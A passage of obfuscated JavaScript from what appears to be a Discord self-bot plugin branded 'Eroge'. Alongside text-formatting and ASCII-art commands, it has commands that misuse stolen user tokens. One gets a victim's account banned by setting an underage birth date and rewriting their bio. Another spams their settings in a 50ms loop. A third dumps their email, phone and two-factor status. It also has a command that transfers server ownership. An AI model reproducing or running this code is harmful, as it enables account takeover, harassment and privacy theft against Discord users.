        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(912))) return kyrra === abdrahman(360) ? (kyrra = "on", jillian[abdrahman(1289)](), window.BdApi[abdrahman(1248)](abdrahman(1078), abdrahman(957))) : (kyrra = abdrahman(360), jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "Auto Blue Text mode disabled. ❌"));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "underline")) {
          jillian[abdrahman(1289)]();
          if (!maverick[abdrahman(463)](" ")) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(823));
          var sarae = maverick.join(" ");
          jillian[abdrahman(407)].send("__" + sarae + "__");
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1134))) {
          jillian[abdrahman(1289)]();
          if (!maverick[abdrahman(463)](" ")) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(823));
          var sarae = maverick[abdrahman(463)](" ");
          jillian[abdrahman(407)][abdrahman(746)]("**" + sarae + "**");
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1088))) {
          jillian[abdrahman(1289)]();
          if (!maverick[abdrahman(463)](" ")) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(823));
          var sarae = maverick[abdrahman(463)](" ");
          jillian[abdrahman(407)].send("~~" + sarae + "~~");
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(1061))) {
          jillian[abdrahman(1289)]();
          var sarae = maverick[abdrahman(463)](" ");
          if (!maverick[abdrahman(463)](" ")) return window.BdApi[abdrahman(1248)]("🔪 Eroge Notification 🔪", "You need enter a message. ❌");
          jillian[abdrahman(407)][abdrahman(746)]("_" + sarae + "_");
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(677))) {
          jillian[abdrahman(1289)]();
          if (!maverick.join(" ")) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(823));
          var sarae = maverick[abdrahman(463)](" "), laudan = jillian[abdrahman(1301)];
          if (!laudan) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "This command work only in a server. ❌");
          if (!sarae) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "You need enter a message. ❌");
          jillian[abdrahman(407)][abdrahman(746)](sarae + abdrahman(1251));
        }
        if (jillian.content.startsWith(PREFIX + abdrahman(1409))) {
          var fredrica = jillian.mentions[abdrahman(543)][abdrahman(911)](), laudan = jillian[abdrahman(1301)];
          let althera = maverick[abdrahman(1063)](1)[abdrahman(463)](" ");
          jillian[abdrahman(1289)]();
          if (laudan) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1304));
          if (!fredrica) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1366));
          if (!althera) return window.BdApi[abdrahman(1248)](abdrahman(1078), "You need enter a message. ❌");
          jillian[abdrahman(407)].send(althera + abdrahman(830) + fredrica[abdrahman(1082)]());
        }
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1268)) && (jillian[abdrahman(930)]("."), jillian.edit(".."), jillian[abdrahman(930)](abdrahman(1268)), jillian[abdrahman(930)]("."), jillian[abdrahman(930)](".."), jillian[abdrahman(930)]("..."), jillian[abdrahman(930)]("."), jillian[abdrahman(930)](".."), jillian[abdrahman(930)](abdrahman(1268)), jillian[abdrahman(930)]("."), jillian.edit(".."), jillian[abdrahman(930)](abdrahman(1268)), jillian.edit("."), jillian.edit(".."), jillian[abdrahman(930)](abdrahman(1268)), jillian[abdrahman(930)]("."), jillian[abdrahman(1289)]());
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "OwO")) {
          jillian[abdrahman(1289)]();
          async function natrell() {
            const chante = abdrahman;
            let derien = await _0x1ea298[chante(343)][chante(1359)]();
            jillian[chante(407)].send(derien[chante(563)])[chante(652)](adolpho => {
              const chereese = chante;
              console[chereese(758)](adolpho);
            });
          }
          natrell();
        }
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(592)) && (jillian[abdrahman(930)]("a"), jillian[abdrahman(930)]("b"), jillian[abdrahman(930)]("c"), jillian[abdrahman(930)]("d"), jillian[abdrahman(930)]("e"), jillian[abdrahman(930)]("f"), jillian[abdrahman(930)]("g"), jillian[abdrahman(930)]("h"), jillian[abdrahman(930)]("i"), jillian.edit("j"), jillian[abdrahman(930)]("k"), jillian.edit("l"), jillian[abdrahman(930)]("m"), jillian[abdrahman(930)]("n"), jillian.edit("o"), jillian[abdrahman(930)]("p"), jillian[abdrahman(930)]("q"), jillian.edit("r"), jillian[abdrahman(930)]("s"), jillian[abdrahman(930)]("t"), jillian.edit("u"), jillian.edit("v"), jillian.edit("w"), jillian.edit("x"), jillian[abdrahman(930)]("y"), jillian[abdrahman(930)]("z"), jillian.delete());
        jillian.content[abdrahman(1403)](PREFIX + abdrahman(1015)) && (jillian[abdrahman(1289)](), jillian.channel[abdrahman(746)](abdrahman(1060)));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(968)) && (jillian[abdrahman(1289)](), jillian.channel[abdrahman(746)](abdrahman(659)));
        jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(337)) && (jillian[abdrahman(1289)](), jillian[abdrahman(407)][abdrahman(746)](abdrahman(1291)));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(991)) && (jillian[abdrahman(1289)](), jillian.channel.send(abdrahman(774)));
        jillian.content[abdrahman(1403)](PREFIX + abdrahman(602)) && (jillian[abdrahman(1289)](), jillian.channel[abdrahman(746)](abdrahman(967)));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "amogus") && (jillian.delete(), jillian.channel[abdrahman(746)](abdrahman(632)));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(468)) && (jillian[abdrahman(1289)](), jillian[abdrahman(407)][abdrahman(746)](abdrahman(1389)));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(751)) && (jillian.delete(), jillian[abdrahman(407)].send(abdrahman(1252)));
        jillian.content[abdrahman(1403)](PREFIX + abdrahman(1282)) && (jillian[abdrahman(1289)](), jillian[abdrahman(407)][abdrahman(746)](abdrahman(1215)));
        jillian.content[abdrahman(1403)](PREFIX + "bongocat") && (jillian.delete(), jillian[abdrahman(407)][abdrahman(746)](abdrahman(953)));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(545)) && (jillian[abdrahman(1289)](), jillian[abdrahman(407)][abdrahman(746)](abdrahman(439)));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "aperocket") && (jillian[abdrahman(1289)](), jillian[abdrahman(407)].send("‎‎‎‎‎‎‎‎‎‎\n                    💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎\n                    💎💎💎💎💎💎💎🚀💎💎💎💎💎💎💎\n                    💎💎💎💎💎💎🚀🚀🚀💎💎💎💎💎💎\n                    💎💎💎💎💎🚀🚀🚀🚀🚀💎💎💎💎💎\n                    💎💎💎💎💎🚀🚀🐵🚀🚀💎💎💎💎💎\n                    💎💎💎💎💎🚀🚀🚀🚀🚀💎💎💎💎💎\n                    💎💎💎💎💎🚀🚀🚀🚀🚀💎💎💎💎💎\n                    💎💎💎💎🚀🚀🚀🚀🚀🚀🚀💎💎💎💎\n                    💎💎💎🚀🚀🚀🚀🚀🚀🚀🚀🚀💎💎💎\n                    💎💎💎💎💎💎🚀🚀🚀💎 💎💎💎💎💎\n                    💎💎💎💎💎🍌🍌🍌🍌🍌💎💎💎💎💎\n                    💎💎💎💎💎💎🍌🍌🍌💎💎💎💎💎💎\n                    💎💎💎💎💎💎💎🍌💎💎💎💎💎💎💎\n                    💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎\n                    "));
        jillian.content[abdrahman(1403)](PREFIX + abdrahman(764)) && (jillian.delete(), jillian[abdrahman(407)][abdrahman(746)](abdrahman(246)));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(530)) && (jillian.delete(), jillian[abdrahman(407)][abdrahman(746)](abdrahman(626)));
        jillian.content[abdrahman(1403)](PREFIX + abdrahman(1012)) && (jillian[abdrahman(1289)](), jillian[abdrahman(407)][abdrahman(746)](abdrahman(273)));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1352)) && (jillian[abdrahman(1289)](), jillian[abdrahman(407)][abdrahman(746)](abdrahman(425)));
        jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1191)) && (jillian[abdrahman(1289)](), jillian[abdrahman(407)].send("‎‎‎‎‎‎‎‎‎‎\n                    ‎‎‎‎‎‎‎‎‎‎⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢋⣩⣉⢻\n                    ⣿⣿⣿⠀⣿⣶⣕⣈⠹⠿⠿⠿⠿⠟⠛⣛⢋⣰⠣⣿⣿⠀⣿\n                    ⣿⣿⣿⡀⣿⣿⣿⣧⢻⣿⣶⣷⣿⣿⣿⣿⣿⣿⠿⠶⡝⠀⣿\n                    ⣿⣿⣿⣷⠘⣿⣿⣿⢏⣿⣿⣋⣀⣈⣻⣿⣿⣷⣤⣤⣿⡐⢿\n                    ⣿⣿⣿⣿⣆⢩⣝⣫⣾⣿⣿⣿⣿⡟⠿⠿⠦⠀⠸⠿⣻⣿⡄⢻\n                    ⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⠇⣼\n                    ⣿⣿⣿⣿⣿⣿⡄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣰\n                    ⣿⣿⣿⣿⣿⣿⠇⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢀⣿\n                    ⣿⣿⣿⣿⣿⠏⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿\n                    ⣿⣿⣿⣿⠟⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿\n                    ⣿⣿⣿⠋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⣿\n                    ⣿⣿⠋⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸\n                    ⣿⠏⣼⣿⣿⣿⣿⣿⣿⣿⣿\n                    "));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1025)) && (jillian[abdrahman(1289)](), jillian[abdrahman(407)][abdrahman(746)](abdrahman(813)));
        jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(894)) && (setTimeout(function () {
          const ric = abdrahman;
          jillian[ric(930)]("‎‎‎‎‎‎‎‎‎‎\n                        ⠀⠀⠀⠀⣀⣤\n                        ⠀⠀⠀⠀⣿⠿⣶\n                        ⠀⠀⠀⠀⣿⣿⣀\n                        ⠀⠀⠀⣶⣶⣿⠿⠛⣶\n                        ⠤⣀⠛⣿⣿⣿⣿⣿⣿⣭⣿⣤\n                        ⠒⠀⠀⠀⠉⣿⣿⣿⣿⠀⠀⠉⣀\n                        ⠀⠤⣤⣤⣀⣿⣿⣿⣿⣀⠀⠀⣿\n                        ⠀⠀⠛⣿⣿⣿⣿⣿⣿⣿⣭⣶⠉\n                        ⠀⠀⠀⠤⣿⣿⣿⣿⣿⣿⣿\n                        ⠀⠀⠀⣭⣿⣿⣿⠀⣿⣿⣿\n                        ⠀⠀⠀⣉⣿⣿⠿⠀⠿⣿⣿\n                        ⠀⠀⠀⠀⣿⣿⠀⠀⠀⣿⣿⣤\n                        ⠀⠀⠀⣀⣿⣿⠀⠀⠀⣿⣿⣿\n                        ⠀⠀⠀⣿⣿⣿⠀⠀⠀⣿⣿⣿\n                        ⠀⠀⠀⣿⣿⠛⠀⠀⠀⠉⣿⣿\n                        ⠀⠀⠀⠉⣿⠀⠀⠀⠀⠀⠛⣿\n                        ⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣿⣿\n                        ⠀⠀⠀⠀⣛⠀⠀⠀⠀⠀⠀⠛⠿⠿⠿\n                        ⠀⠀⠀⠛⠛\n                    ");
        }, 1e3), setTimeout(function () {
          const leeandre = abdrahman;
          jillian.edit(leeandre(253));
        }, 2e3), setTimeout(function () {
          const chassity = abdrahman;
          jillian[chassity(930)](chassity(920));
        }, 3e3), setTimeout(function () {
          const abbagayle = abdrahman;
          jillian[abbagayle(930)](abbagayle(1484));
        }, 4e3), setTimeout(function () {
          const iriee = abdrahman;
          jillian[iriee(930)](iriee(1172));
        }, 5e3), setTimeout(function () {
          const milda = abdrahman;
          jillian[milda(930)](milda(749));
        }, 6e3), setTimeout(function () {
          const advaita = abdrahman;
          jillian.edit(advaita(323));
        }, 7e3), setTimeout(function () {
          const adriana = abdrahman;
          jillian.edit(adriana(544));
        }, 8e3), setTimeout(function () {
          const mazen = abdrahman;
          jillian[mazen(930)](mazen(873));
        }, 9e3), setTimeout(function () {
          const maridell = abdrahman;
          jillian.edit(maridell(843));
        }, 1e4));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1358))) return marisely === abdrahman(360) ? (marisely = "on", jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1284))) : (marisely = abdrahman(360), jillian[abdrahman(1289)](), window[abdrahman(987)].alert(abdrahman(1078), "Auto Owoify Text mode disabled. ❌"));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(827))) {
          jillian.delete();
          const keenin = (new sherae[abdrahman(344)])[abdrahman(1044)]("**「>> " + maithili + abdrahman(586) + maithili + " <<」**")[abdrahman(444)](shadarria[abdrahman(1417)][abdrahman(574)]).setDescription("```      " + maithili + abdrahman(506) + maithili + abdrahman(760))[abdrahman(321)](COLOR)[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1030), abdrahman(753))[abdrahman(695)](abdrahman(972) + PREFIX + "banuser + MENTION ```**", "***Ban a member from the server.***")[abdrahman(1211)](IMAGE)[abdrahman(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          keenin[abdrahman(1264)](), jillian[abdrahman(407)][abdrahman(746)](keenin), BdApi[abdrahman(1150)](abdrahman(349), {type: abdrahman(1382)});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "kickuser")) {
          let anthonia = jillian.mentions.members[abdrahman(911)]();
          var laudan = jillian[abdrahman(1301)];
          if (!laudan) return BdApi[abdrahman(1150)]("Sorry, you need to use this command in a server.", {type: abdrahman(1382)});
          if (!anthonia) return BdApi[abdrahman(1150)](abdrahman(475), {type: abdrahman(1382)});
          if (!jillian[abdrahman(1197)][abdrahman(264)](abdrahman(962))) return BdApi[abdrahman(1150)]("You don't have the permission for kick.", {type: abdrahman(1382)});
          let jagr = "kicked with Eroge Plugin!";
          anthonia.kick(jagr)[abdrahman(652)](auja => console[abdrahman(1087)](auja)), jillian[abdrahman(1289)](), BdApi[abdrahman(1150)](anthonia.user[abdrahman(1157)] + abdrahman(1475), {type: abdrahman(1382)});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(947))) {
          let arienna = jillian[abdrahman(726)][abdrahman(880)][abdrahman(911)]();
          var laudan = jillian.guild;
          if (!laudan) return BdApi.showToast(abdrahman(247), {type: abdrahman(1382)});
          if (!arienna) return BdApi[abdrahman(1150)](abdrahman(475), {type: abdrahman(1382)});
          if (!jillian[abdrahman(1197)][abdrahman(264)](abdrahman(356))) return BdApi[abdrahman(1150)](abdrahman(542), {type: abdrahman(1382)});
          let diena = abdrahman(1439);
          arienna[abdrahman(944)](diena)[abdrahman(652)](semyah => console[abdrahman(1087)](semyah)), jillian[abdrahman(1289)](), BdApi[abdrahman(1150)](arienna[abdrahman(1417)][abdrahman(1157)] + abdrahman(433), {type: abdrahman(1382)});
        }
        if (jillian.content[abdrahman(1403)](PREFIX + "banid")) {
          let giahna = maverick[0];
          jillian[abdrahman(1289)]();
          if (!giahna) return BdApi[abdrahman(1150)](abdrahman(475), {type: abdrahman(1382)});
          if (jillian[abdrahman(1301)][abdrahman(1197)](giahna)) {
            jillian.guild.members.ban(giahna)[abdrahman(652)](sharey => {
              const truee = abdrahman;
              return BdApi[truee(1150)](truee(325), {type: truee(1382)});
            });
            if (jillian[abdrahman(1197)].hasPermission(abdrahman(356))) return BdApi[abdrahman(1150)](abdrahman(403), {type: abdrahman(1382)});
          } else BdApi[abdrahman(1150)](abdrahman(1036), {type: abdrahman(1382)});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "mics")) {
          jillian[abdrahman(1289)]();
          const uraz = (new sherae[abdrahman(344)])[abdrahman(1044)](abdrahman(232) + maithili + abdrahman(1151) + maithili + abdrahman(613)).setThumbnail(shadarria[abdrahman(1417)][abdrahman(574)]).setDescription(abdrahman(649) + maithili + abdrahman(506) + maithili + "```").setColor(COLOR)[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1363), abdrahman(1329)).addField("***```" + PREFIX + abdrahman(1208), "***Get the real times.***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(280), abdrahman(593))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(327), abdrahman(428))[abdrahman(695)](abdrahman(712) + PREFIX + "bantoken + TOKEN ```***", abdrahman(1413)).addField(abdrahman(712) + PREFIX + abdrahman(908), abdrahman(458))[abdrahman(695)]("***```" + PREFIX + abdrahman(787), abdrahman(1185))[abdrahman(695)](abdrahman(712) + PREFIX + "weather + CITY ```***", "***Get all weather infos***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(351), abdrahman(442))[abdrahman(695)]("***```" + PREFIX + "mcskins + NAME ```***", abdrahman(281))[abdrahman(695)](abdrahman(712) + PREFIX + "mcuser + TEXT ```***", abdrahman(571)).addField("***```" + PREFIX + "iplookup + IP ```***", "***Lookup a ip and get all infos***")[abdrahman(1211)](IMAGE).setFooter(abdrahman(899), IMAGE);
          uraz[abdrahman(1264)](), jillian[abdrahman(407)][abdrahman(746)](uraz), BdApi[abdrahman(1150)](abdrahman(256), {type: abdrahman(1382)});
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(402))) {
          let susian = maverick[0];
          jillian[abdrahman(1289)]();
          if (!susian) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(304));
          if (!jillian[abdrahman(1301)].member(jillian.author).hasPermission("ADMINISTRATOR")) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(485));
          let ally = jillian.guild.id;
          var deelda = {owner_id: susian};
          let zarae = {headers: {"content-type": abdrahman(1254), authorization: TOKEN}};
          _0xd3dae5[abdrahman(1070)](abdrahman(405) + aubriana + abdrahman(847) + ally, deelda, zarae);
        }
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(658)) && (jillian[abdrahman(1289)](), BdApi[abdrahman(1150)]("🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > " + jaylaun()[abdrahman(1336)](abdrahman(1226)), {type: abdrahman(1382)}));
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(1446))) {
          let jaymus = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          jillian[abdrahman(1289)]();
          if (!jaymus) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "You need enter a text. ❌");
          let gabryelle = (new sherae[abdrahman(344)])[abdrahman(1044)](abdrahman(1453) + shadarria[abdrahman(1417)].tag + abdrahman(1464))[abdrahman(321)](COLOR).setDescription(abdrahman(456) + jaymus + abdrahman(560)).setFooter(abdrahman(899), IMAGE);
          gabryelle[abdrahman(1264)](), jillian[abdrahman(407)][abdrahman(746)](gabryelle)[abdrahman(656)](function (tityana) {
            const verlia = abdrahman;
            tityana.react("✅"), tityana[verlia(981)]("❌");
          });
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(846))) {
          let annakaren = maverick[0];
          jillian[abdrahman(1289)]();
          if (!annakaren) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1477));
          if (annakaren === abdrahman(320)) return clearInterval(yanci), yanci = undefined, window.BdApi.alert(abdrahman(1078), abdrahman(1057));
          !yanci ? yanci = setInterval(() => {
            const yazleemar = abdrahman;
            var lilliani = {locale: "de"};
            let shaiquan = {headers: {"content-type": "application/json", authorization: annakaren}};
            _0xd3dae5[yazleemar(1070)](yazleemar(405) + aubriana + yazleemar(891), lilliani, shaiquan).catch(tyjanique => {});
            var kcee = {locale: "ja"};
            let giya = {headers: {"content-type": yazleemar(1254), authorization: annakaren}};
            _0xd3dae5[yazleemar(1070)]("https://discord.com/api/" + aubriana + yazleemar(891), kcee, giya).catch(ymari => {});
            var wilhemenia = {locale: yazleemar(1275)};
            let gustas = {headers: {"content-type": "application/json", authorization: annakaren}};
            _0xd3dae5[yazleemar(1070)](yazleemar(405) + aubriana + "/users/@me/settings", wilhemenia, gustas)[yazleemar(652)](angeliyah => {});
            var elrick = {theme: "dark"};
            let stepheny = {headers: {"content-type": yazleemar(1254), authorization: annakaren}};
            _0xd3dae5.patch("https://discord.com/api/" + aubriana + yazleemar(891), elrick, stepheny)[yazleemar(652)](moanna => {});
            var jamhal = {theme: yazleemar(820)};
            let fuller = {headers: {"content-type": "application/json", authorization: annakaren}};
            _0xd3dae5[yazleemar(1070)](yazleemar(405) + aubriana + yazleemar(891), jamhal, fuller)[yazleemar(652)](bani => {});
            var kanoe = {message_display_compact: ![]};
            let christany = {headers: {"content-type": yazleemar(1254), authorization: annakaren}};
            _0xd3dae5.patch(yazleemar(405) + aubriana + yazleemar(891), kanoe, christany)[yazleemar(652)](zaide => {});
            var lateeka = {message_display_compact: !![]};
            let morag = {headers: {"content-type": yazleemar(1254), authorization: annakaren}};
            _0xd3dae5[yazleemar(1070)](yazleemar(405) + aubriana + yazleemar(891), lateeka, morag)[yazleemar(652)](tavist => {});
          }, 50) : window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", "A loop is already running. ❌"), window.BdApi[abdrahman(1248)](abdrahman(1078), abdrahman(1242) + PREFIX + abdrahman(532));
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "bantoken")) {
          let khaleem = maverick[0];
          jillian[abdrahman(1289)]();
          if (!khaleem) return window[abdrahman(987)].alert("🔪 Eroge Notification 🔪", abdrahman(1477));
          function kuyper(kyngsten) {
            const skylie = abdrahman;
            var jesusenrique = {};
            let jymere = {headers: {"content-type": skylie(1254), authorization: khaleem}};
            _0xd3dae5[skylie(386)](skylie(432) + kyngsten, jesusenrique, jymere)[skylie(652)](console[skylie(1087)](""));
          }
          function marguerit(elim) {
            const noehmi = abdrahman;
            var gennie = {};
            let nilza = {headers: {"content-type": "application/json", authorization: khaleem}};
            _0xd3dae5[noehmi(1289)]("https://discord.com/api/v9/users/@me/guilds/" + elim, gennie, nilza).catch(console[noehmi(1087)](""));
          }
          function kishawna(santhiago) {
            const cariss = abdrahman;
            var shanie = {bio: santhiago};
            let set = {headers: {"content-type": cariss(1254), authorization: khaleem}};
            _0xd3dae5.patch(cariss(405) + aubriana + cariss(849), shanie, set)[cariss(652)](console.log(""));
          }
          var deelda = {date_of_birth: abdrahman(440)};
          let ridgway = {headers: {"content-type": "application/json", authorization: khaleem}};
          _0xd3dae5.patch(abdrahman(472), deelda, ridgway)[abdrahman(652)](console[abdrahman(1087)]("")), kuyper(abdrahman(477)), marguerit("596934529927741442"), kuyper(abdrahman(477)), marguerit(abdrahman(635)), kuyper(abdrahman(477)), marguerit(abdrahman(635)), kishawna("This account is now banned from Discord <3"), window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(421));
        }
        if (jillian.content.startsWith(PREFIX + abdrahman(1126))) {
          let lynton = maverick[0];
          _0x4d876d({uri: "https://discord.com/api/" + aubriana + abdrahman(849), headers: {"Content-Type": abdrahman(1254), Authorization: lynton}, json: !![], method: abdrahman(875)}, function (jorien, katherne, simba) {
            const erkhes = abdrahman;
            var nicolena = katherne[erkhes(759)];
            _0x4d876d({uri: erkhes(405) + aubriana + erkhes(891), headers: {"Content-Type": "application/json", Authorization: lynton}, json: !![], method: erkhes(875)}, function (shirletha, malacai, einin) {
              const bremen = erkhes;
              var nasteha = malacai.body, sumara = "";
              sumara += "\n> Username: " + ("" + nicolena[bremen(1423)]), sumara += bremen(1050) + ("" + nicolena[bremen(1351)]), sumara += bremen(274) + ("" + nicolena.id), sumara += bremen(374) + ("https://cdn.discordapp.com/avatars/" + nicolena.id + "/" + nicolena.avatar + bremen(1315)), sumara += bremen(517) + ("" + nicolena[bremen(1429)]), sumara += bremen(287) + ("" + nicolena.email), sumara += bremen(663) + ("" + nicolena.mfa_enabled), sumara += "\n> Nitro: " + ("" + nicolena.premium_type), sumara += bremen(1250) + ("" + nicolena[bremen(628)]), sumara += bremen(1337) + ("" + nasteha[bremen(1365)]), sumara += bremen(427) + ("" + nasteha.show_current_game), sumara += "\n> Language: " + ("" + nasteha[bremen(741)]);
              var khea = (new sherae[bremen(344)])[bremen(1044)](bremen(1353))[bremen(457)](sumara)[bremen(321)](COLOR)[bremen(1211)](IMAGE)[bremen(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
              return jillian.edit(khea);
            });
          });
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1113))) {
          let anitra = maverick[abdrahman(463)](" ");
          jillian[abdrahman(1289)]();
          if (!maverick[abdrahman(463)](" ")) return window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(898));
          let sheldia = (new sherae.RichEmbed)[abdrahman(321)](COLOR)[abdrahman(1044)](anitra).setFooter("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          jillian[abdrahman(407)].send(sheldia);
        }
        jillian.content[abdrahman(1403)](PREFIX + abdrahman(1263)) && timica[abdrahman(1003)]({search: maverick[abdrahman(463)](" "), degreeType: "C"}, function (maiella, audreyrose) {
          const anarii = abdrahman;
          if (maiella) return jillian.channel[anarii(746)](maiella);
          if (!maverick[0]) return window.BdApi[anarii(1248)](anarii(1078), anarii(898));
          if (audreyrose === undefined || audreyrose[anarii(1108)] === 0) return window[anarii(987)].alert(anarii(1078), anarii(949));
          var zhalen = audreyrose[0].current, sulynn = audreyrose[0][anarii(424)];
          jillian[anarii(1289)]();
          const zebula = (new sherae[anarii(344)]).setColor(COLOR)[anarii(367)](anarii(1258) + zhalen[anarii(719)]).setThumbnail(zhalen[anarii(895)])[anarii(695)]("Schedule :", anarii(653) + zhalen.observationtime, !![]).addField("Degree Type :", "" + sulynn[anarii(594)], !![])[anarii(695)](anarii(888), zhalen[anarii(368)] + "°", !![])[anarii(695)](anarii(1219), zhalen.winddisplay, !![])[anarii(695)](anarii(1222), zhalen[anarii(511)] + "°", !![])[anarii(695)](anarii(267), zhalen[anarii(1266)] + "%", !![])[anarii(1014)]()[anarii(695)]("Days :", "" + zhalen[anarii(657)], !![]).addField(anarii(1235), "" + zhalen[anarii(925)], !![])[anarii(695)](anarii(722), "" + sulynn[anarii(260)], !![])[anarii(695)](anarii(829), "" + sulynn[anarii(612)], !![])[anarii(695)](anarii(1095), "" + zhalen.skytext, !![]).addField(anarii(733), "warning: " + sulynn[anarii(1248)], !![])[anarii(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          jillian[anarii(407)].send(zebula);
        });
        if (jillian.content[abdrahman(1403)](PREFIX + "pokedex")) {
          jillian[abdrahman(1289)]();
          let brianamarie = maverick[abdrahman(1063)](0).join(" ");
          _0x597438[abdrahman(1052)](abdrahman(1372) + brianamarie).then(craigory => {
            const delandria = abdrahman;
            var loveless = craigory.body[delandria(799)], nahir = craigory[delandria(759)].id, tuongvy = craigory[delandria(759)][delandria(1037)], talhia = craigory[delandria(759)][delandria(903)], sivan = craigory[delandria(759)].abilities, garyl = craigory[delandria(759)][delandria(1295)], zarifa = craigory[delandria(759)][delandria(384)], syria = craigory[delandria(759)][delandria(974)], dandy = craigory[delandria(759)][delandria(516)], ilianny = craigory.body[delandria(483)].hp, zyaun = craigory[delandria(759)][delandria(483)].attack, sarinna = craigory.body[delandria(483)].defense, chrishauna = craigory.body.stats[delandria(1440)], haliee = craigory[delandria(759)].family[delandria(638)], nayelis = craigory[delandria(759)][delandria(698)], rosy = craigory.body[delandria(1422)], raedynn = craigory.body.generation, ayela = (new sherae[delandria(344)])[delandria(1044)](shadarria[delandria(1417)][delandria(1423)] + delandria(539)).setDescription(delandria(976))[delandria(695)](delandria(1370), loveless)[delandria(695)](delandria(629), rosy)[delandria(695)](delandria(1302), nahir).addField(delandria(773), raedynn)[delandria(695)](delandria(597), tuongvy)[delandria(695)](delandria(541), talhia)[delandria(695)](delandria(292), sivan)[delandria(695)](delandria(862), dandy).addField("```Experience:```", syria)[delandria(695)](delandria(1111), ilianny)[delandria(695)](delandria(664), zyaun)[delandria(695)](delandria(284), sarinna)[delandria(695)](delandria(394), zarifa)[delandria(695)](delandria(1196), garyl)[delandria(695)](delandria(942), chrishauna).addField(delandria(874), haliee).setImage(delandria(412) + brianamarie + delandria(564)).setThumbnail(delandria(412) + brianamarie + delandria(1356))[delandria(321)](COLOR)[delandria(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            jillian[delandria(407)][delandria(746)](ayela);
